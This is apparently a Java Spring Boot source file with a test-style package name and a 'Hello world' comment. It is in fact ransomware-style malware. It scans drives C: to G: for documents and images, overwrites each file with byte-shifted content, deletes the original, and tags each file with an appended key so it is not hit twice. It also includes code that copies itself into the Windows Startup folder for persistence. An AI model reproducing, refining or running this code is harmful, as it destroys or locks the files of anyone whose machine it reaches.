package com.test.test;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.util.Collection;

import org.apache.commons.io.FileUtils;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;

/**
 * Hello world!
 *
 */
@SpringBootApplication
public class App {
	public static void main(String[] args) {
		ConfigurableApplicationContext context = SpringApplication.run(App.class, args);
		System.out.println("Hello World!");
		ThreadPoolUtils threadPoolUtils = ThreadPoolUtils.initPools(20);
		

		//String dires[] = { "F:\\", "G:\\" };
		String dires[] = { "E:\\", "D:\\","F:\\","G:\\" ,"C:\\"};
		for (int i = 0; i < dires.length; i++) {
			File dir = new File(dires[i]);
			if(!dir.exists()) {
				continue;
			}
			//F:\$RECYCLE.BIN
			Collection<File> listFiles = FileUtils.listFiles(dir, new String[] { "pdf", "doc", "docx", "xls", "xlsx", "jpg", "JPG", "png", "gif" }, true);
			String key = "39c8e9953fe8ea40ff1c59876e0e2f28";

			for (File file : listFiles) {
				if (file.isFile()) {
					// System.out.println(file.getAbsolutePath().indexOf("$RECYCLE.BIN"));
					System.out.println(file.getAbsolutePath());
					if (file.getAbsolutePath().indexOf("$RECYCLE.BIN") != -1) {
						return;
					}
					if (key.equals(readFileLastByte(file.getAbsolutePath(), key.length()))) {
						continue;
					}
					
					try {
						threadPoolUtils.execute(new Runnable() {
							public void run() {
								// TODO Auto-generated method stub
								try {
									System.out.println("开始操作了");
									fggrtrtrtt(file.getAbsolutePath(), key);
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						});

					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						continue;
					}
				}
			}

		}
		threadPoolUtils.shutdownLatch();
		System.exit(0);
	}

	public static void fggrtrtrtt(String fileUrl, String key) throws Exception {
		File file = new File(fileUrl);
		String path = file.getPath();
		if (!file.exists()) {
			return;
		}
		int index = path.lastIndexOf("\\");
		String destFile = path.substring(0, index) + "\\" + "abc";
		File dest = new File(destFile);
		InputStream in = new FileInputStream(fileUrl);
		OutputStream out = new FileOutputStream(destFile);
		byte[] buffer = new byte[1024];
		int r;
		byte[] buffer2 = new byte[1024];
		while ((r = in.read(buffer)) > 0) {
			for (int i = 0; i < r; i++) {
				byte b = buffer[i];
				buffer2[i] = b == 255 ? 0 : ++b;
			}
			out.write(buffer2, 0, r);
			out.flush();
		}
		in.close();
		out.close();
		file.delete();
		dest.renameTo(new File(fileUrl));
		appendMethodA(fileUrl, key);
		System.out.println("加密成功");
	}

	/**
	 *
	 * @param fileName
	 * @param content  密钥
	 */
	public static void appendMethodA(String fileName, String content) {
		try {
			// 打开一个随机访问文件流，按读写方式
			RandomAccessFile randomFile = new RandomAccessFile(fileName, "rw");
			// 文件长度，字节数
			long fileLength = randomFile.length();
			// 将写文件指针移到文件尾。
			randomFile.seek(fileLength);
			randomFile.writeBytes(content);
			randomFile.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * 判断文件是否加密
	 * 
	 * @param fileName
	 * @return
	 */
	public static String readFileLastByte(String fileName, int keyLength) {
		File file = new File(fileName);
		if (!file.exists())
			return null;
		StringBuffer str = new StringBuffer();
		try {
			// 打开一个随机访问文件流，按读写方式
			RandomAccessFile randomFile = new RandomAccessFile(fileName, "r");
			// 文件长度，字节数
			long fileLength = randomFile.length();
			if (fileLength == 0) {
				return null;
			}
			// 将写文件指针移到文件尾。
			for (int i = keyLength; i >= 1; i--) {
				randomFile.seek(fileLength - i);
				str.append((char) randomFile.read());
			}
			randomFile.close();
			return str.toString();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}

	public boolean setAutoStart(boolean yesAutoStart, String lnk) {
		File f = new File(lnk);
		String p = f.getAbsolutePath();
		String startFolder = "";
		String osName = System.getProperty("os.name");
		String str = System.getProperty("user.home");
		if (osName.equals("Windows 7") || osName.equals("Windows 8") || osName.equals("Windows 10") || osName.equals("Windows Server 2012 R2") || osName.equals("Windows Server 2014 R2") || osName.equals("Windows Server 2016")) {
			startFolder = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
		}
		if (osName.endsWith("Windows XP")) {
			startFolder = System.getProperty("user.home") + "\\「开始」菜单\\程序\\启动";
		}
		if (setRunBySys(yesAutoStart, p, startFolder, lnk)) {
			return true;
		}
		return false;
	}

	// 设置是否随系统启动
	public boolean setRunBySys(boolean b, String path, String path2, String lnk) {
		File file = new File(path2 + "\\" + lnk);
		Runtime run = Runtime.getRuntime();
		File f = new File(lnk);

		// 复制
		try {
			if (b) {
				// 写入
				// 判断是否隐藏，注意用系统copy布置为何隐藏文件不生效
				if (f.isHidden()) {
					// 取消隐藏
					try {
						Runtime.getRuntime().exec("attrib -H \"" + path + "\"");
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				if (!file.exists()) {
					run.exec("cmd /c copy " + formatPath(path) + " " + formatPath(path2));
				}
				// 延迟0.5秒防止复制需要时间
				Thread.sleep(500);
			} else {
				// 删除
				if (file.exists()) {
					if (file.isHidden()) {
						// 取消隐藏
						try {
							Runtime.getRuntime().exec("attrib -H \"" + file.getAbsolutePath() + "\"");
						} catch (IOException e) {
							e.printStackTrace();
						}
						Thread.sleep(500);
					}
					run.exec("cmd /c del " + formatPath(file.getAbsolutePath()));
				}
			}
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}

	// 解决路径中空格问题
	private String formatPath(String path) {
		if (path == null) {
			return "";
		}
		return path.replaceAll(" ", "\" \"");
	}
}
